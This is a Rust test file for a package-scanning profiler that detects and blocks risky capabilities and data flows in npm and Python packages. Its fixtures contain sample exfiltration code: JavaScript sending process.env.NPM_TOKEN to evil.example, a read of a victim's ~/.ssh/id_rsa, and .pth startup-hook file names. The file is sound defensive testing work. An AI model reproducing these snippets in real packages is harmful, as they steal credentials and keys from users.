//! `profiler` domain tests, extracted from the original monolithic tests.rs.

use super::*;
use crate::*;

#[test]
fn profiler_turns_host_access_into_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
    );
    let profile = profiler.finish();
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_preserves_static_url_ports_for_network_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "fetch('HTTPS://evil.example:8443/path'); fetch('http://plain.example:8080/a');",
    );
    let profile = profiler.finish();

    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example:8443"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "plain.example:8080"));
    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_ignores_static_urls_without_network_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "pygments/lexers/python.py",
        "__url__ = 'https://www.python.org/'\nDOC = 'https://docs.python.org/'\n",
    );
    profiler.scan_file(
        "client.py",
        "endpoint = 'https://api.example.com/v1'; fetch(endpoint)",
    );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "pygments/lexers/python.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "client.py"
            && finding.kind == CapabilityKind::HttpRequest
            && finding.target == "api.example.com"));
}

#[test]
fn profiler_ignores_non_executable_assets() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/lib/lib.dom.d.ts",
        "declare function fetch(input: RequestInfo): Promise<Response>;",
    );
    profiler.scan_file(
        "package/lib/typesMap.json",
        r#"{ "axios": "not executable source", "url": "https://example.invalid" }"#,
    );
    profiler.scan_file(
        "package/pyproject.toml",
        r#"[project.scripts]\nrun = "tool:main""#,
    );
    let profile = profiler.finish();

    assert_eq!(profile.files_scanned, 0);
    assert!(profile.capabilities.is_empty());
}

#[test]
fn profiler_distinguishes_regex_exec_from_dynamic_eval() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/functions/coerce.js",
        "while ((next = coerceRtlRegex.exec(version))) { match = next }",
    );
    profiler.scan_file("package/runtime.js", "eval(source); new Function(source);");
    profiler.scan_file("package/tool.py", "exec(code)\n");
    let profile = profiler.finish();

    let dynamic_eval_findings = profile
        .capabilities
        .iter()
        .filter(|finding| finding.kind == CapabilityKind::DynamicEval)
        .collect::<Vec<_>>();
    // Real dynamic eval is flagged on runtime.js (eval / new Function) and
    // tool.py (exec); the regex `.exec` on coerce.js is NOT. (runtime.js may
    // contribute more than one finding now that `new Function` is detected
    // distinctly from `eval`, so assert by source-file presence.)
    let sources: BTreeSet<&str> = dynamic_eval_findings
        .iter()
        .map(|finding| finding.source.as_str())
        .collect();
    assert_eq!(
        sources,
        BTreeSet::from(["package/runtime.js", "package/tool.py"])
    );
}

#[test]
fn profiler_distinguishes_python_module_references_from_http_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "requests/__init__.py",
        "from .sessions import Session\n__title__ = 'requests'\n",
    );
    profiler.scan_file(
            "client.py",
            "requests.get(url)\nurllib.request.urlopen(url)\nhttpx.post(url)\nsocket.create_connection(addr)\n",
        );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "requests/__init__.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert_eq!(
        profile
            .capabilities
            .iter()
            .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
            .count(),
        1
    );
}

#[test]
fn profiler_distinguishes_file_like_write_from_file_write() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("package/models.py", "buffer.write(chunk)\n");
    profiler.scan_file("package/cache.py", "open(cache_path, 'wb').write(data)\n");
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/models.py"
            && finding.kind == CapabilityKind::FsWrite));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/cache.py"
            && finding.kind == CapabilityKind::FsWrite));
}

// F4: a literal file-read path is captured as the FsRead target (not "*").

#[test]
fn profiler_captures_literal_fs_read_path() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "lib/secrets.js",
        "const k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::FsRead
                && finding.target == "/home/victim/.ssh/id_rsa"),
        "literal read path must be captured: {:?}",
        profile.capabilities
    );
}

// F4: reading a sensitive file is Blocked at verdict time even under a
// wildcard fs.read:* grant (mirrors the in-cell sensitive-read guarantee).

#[test]
fn sensitive_literal_read_blocked_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        // Wildcard fs.read grant must NOT cover sensitive files.
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Blocked,
        "reading ~/.ssh/id_rsa must be blocked even under fs.read:*"
    );
}

// F4 over-block guard: a literal read of an ordinary project file IS allowed
// under a wildcard fs.read:* grant.

#[test]
fn ordinary_literal_read_allowed_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst c = fs.readFileSync('./config.json');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Accepted,
        "an ordinary literal project-file read must remain accepted under fs.read:*"
    );
}

// F5: Python startup hooks are never copied into site-packages.

#[test]
fn python_startup_hooks_are_not_installed() {
    for hook in [
        "evil.pth",
        "sitecustomize.py",
        "usercustomize.py",
        "pkg/sub/inject.pth",
    ] {
        assert!(
            !should_copy_python_sdist_path(Path::new(hook)),
            "{hook} must not be copied into site-packages"
        );
        assert!(is_python_startup_hook_path(Path::new(hook)), "{hook}");
    }
    // ordinary modules still copy
    assert!(should_copy_python_sdist_path(Path::new("pkg/__init__.py")));
    assert!(should_copy_python_sdist_path(Path::new("pkg/site.py")));
}

#[test]
fn generated_profile_module_deduplicates_capability_ops() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "a.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "b.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "a.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "b.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "a.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "b.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let cap_ops = module.functions[0]
        .code
        .iter()
        .filter(|op| matches!(op, Op::Cap(_)))
        .count();

    // Findings dedup by (kind, target) to 3 unique caps: EnvRead(NPM_TOKEN),
    // FsRead(*), HttpRequest(evil.example). The F2 flow model then emits one
    // `push source; consume in sink` pair per (source x sink) = 2 sources x
    // 1 sink = 2 pairs = 4 cap ops (env->http and fs-read->http both modeled).
    assert_eq!(cap_ops, 4);
}

#[test]
fn detects_all_host_grants_for_flow_escape_hatch() {
    let grants = vec![
        Capability::EnvRead("*".to_owned()),
        Capability::FsRead("*".to_owned()),
        Capability::FsWrite("*".to_owned()),
        Capability::HttpHost("*".to_owned()),
        Capability::DnsHost("*".to_owned()),
        Capability::ProcSpawn("*".to_owned()),
        Capability::DynamicEval,
    ];

    assert!(grants_all_host_capabilities(&grants));
    assert!(!grants_all_host_capabilities(&grants[..grants.len() - 1]));
}

#[test]
fn generated_profile_module_models_static_env_to_network_flow() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static env read `NPM_TOKEN`".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static URL host `evil.example`".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let http = module.functions[0]
        .code
        .iter()
        .find_map(|op| match op {
            Op::Cap(CapOp::HttpRequest { request }) => Some(request),
            _ => None,
        })
        .unwrap();
    assert!(http.body_from_stack);

    let policy = Policy::pure()
        .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
        .allow_capability(Capability::HttpHost("evil.example".to_owned()));
    let error = verify_module(&module, &policy).unwrap_err();
    assert!(error.findings.iter().any(|finding| finding
        .message
        .contains("env:NPM_TOKEN may not flow to network:evil.example")));
}

#[test]
fn compile_source_directory_emits_signed_verifiable_artifact() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
            source.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
        )
        .unwrap();
    fs::create_dir_all(source.join("node_modules/noisy")).unwrap();
    fs::write(
        source.join("node_modules/noisy/index.js"),
        "fetch('https://ignored.example')\n",
    )
    .unwrap();

    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        allowed_capabilities: vec![
            Capability::EnvRead("NPM_TOKEN".to_owned()),
            Capability::HttpHost("evil.example".to_owned()),
        ],
        allowed_flows: Vec::new(),
        write_artifact: true,
    })
    .unwrap();

    assert_eq!(report.artifact.package.name, "date-helper");
    assert_eq!(report.artifact.files_scanned, 1);
    assert_eq!(report.artifact.behavior, Behavior::HostCapability);
    assert_eq!(report.artifact.verdict, Verdict::Blocked);
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
    assert!(!report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.target == "ignored.example"));
    assert!(report
        .artifact
        .verifier_findings
        .iter()
        .any(|finding| finding.contains("env:NPM_TOKEN may not flow to network:evil.example")));
    verify_artifact_signature(&report.artifact).unwrap();
    let artifact_path = report.artifact_path.unwrap();
    assert!(artifact_path.ends_with("omc.json"));
    let stored: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&stored).unwrap();
}

#[test]
fn profiler_ignores_tests_and_packaging_files() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
    profiler.scan_file("pkg/setup.py", "open('README.md').read()");
    let profile = profiler.finish();
    assert!(profile.capabilities.is_empty());
    assert_eq!(profile.files_scanned, 0);
}

#[test]
fn generated_profile_module_rejects_capabilities_by_default() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    }];
    let module = module_from_profile(&package, &findings);
    let error = verify_module(&module, &Policy::pure()).unwrap_err();
    assert!(error
        .findings
        .iter()
        .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
}
